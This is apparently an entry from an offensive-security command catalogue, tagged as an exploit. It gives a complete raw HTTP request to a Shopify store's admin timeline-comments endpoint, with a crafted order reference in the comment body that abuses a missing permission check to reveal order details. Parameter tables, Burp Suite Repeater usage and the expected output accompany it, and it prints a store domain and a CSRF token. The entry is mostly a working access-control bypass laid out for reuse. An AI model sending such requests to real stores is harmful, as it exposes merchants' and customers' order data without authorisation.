---
id: cmd-shopify-order-ref
data: >-
  POST /admin/transfers/774529/timeline_comments HTTP/1.1

  Host: vijaygangani1110store.myshopify.com

  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101
  Firefox/47.0

  Accept: */*

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate, br

  X-CSRF-Token:
  RZIoZCcT7SGMNDwD6wl0gHzb1ACcOm1uSXy/NbItuXwQr/95Jzg+24HCWIM4Wzc0Z/F76VYd4iuPF1jj7X0zrQ==

  X-Requested-With: XMLHttpRequest

  Referer: https://vijaygangani1110store.myshopify.com/admin/transfers/774529

  Content-Length: 187

  Content-Type: multipart/form-data;
  boundary=---------------------------191772538514734

  Cookie:[cookie_values]

  Connection: keep-alive


  -----------------------------191772538514734

  Content-Disposition: form-data; name="timeline_comment[body]"


  [#O3599995137|Order #1005]

  -----------------------------191772538514734--
tags:
  - exploit
  - shopify
  - disclosure
type: command
output: null
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.792Z'
verified: false
validated: true
submitted: true
---
# Submit-Order-Reference-in-Timeline-Comment

## Command

```http
POST /admin/transfers/774529/timeline_comments HTTP/1.1
Host: vijaygangani1110store.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-CSRF-Token: RZIoZCcT7SGMNDwD6wl0gHzb1ACcOm1uSXy/NbItuXwQr/95Jzg+24HCWIM4Wzc0Z/F76VYd4iuPF1jj7X0zrQ==
X-Requested-With: XMLHttpRequest
Referer: https://vijaygangani1110store.myshopify.com/admin/transfers/774529
Content-Length: 187
Content-Type: multipart/form-data; boundary=---------------------------191772538514734
Cookie:[cookie_values]
Connection: keep-alive

-----------------------------191772538514734
Content-Disposition: form-data; name="timeline_comment[body]"

[#O3599995137|Order #1005]
-----------------------------191772538514734--
```

## Description

This HTTP POST request submits a timeline comment with a crafted order reference, exploiting the lack of permission checks to disclose order details when intercepted and modified from a permitted reference.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Host | Shopify store domain | Yes |
| X-CSRF-Token | Anti-CSRF token from session | Yes |
| Cookie | Authentication session cookies | Yes |
| timeline_comment[body] | Comment body with [#O<order_ID>|text] format | Yes |
| Referer | Admin transfer page URL | Yes |

## Examples

### Basic Usage

Use in Burp Suite Repeater or similar to send after modification:

```http
POST /admin/transfers/<transfer_ID>/timeline_comments HTTP/1.1
... (as above with actual order ID)
```

### Advanced Usage

Modify boundary and length dynamically; include additional form fields if needed.

```http
... (full request with updated Content-Length)
```

## Expected Output

Successful response (200 OK) with the comment saved; upon viewing, order details like summary of Order #1005 rendered in the comment body.

## Related

- [[commands/Submit-Customer-Reference-in-Timeline-Comment]]
- [[procedures/Bypass-Access-Controls-via-Crafted-Comment-References]]
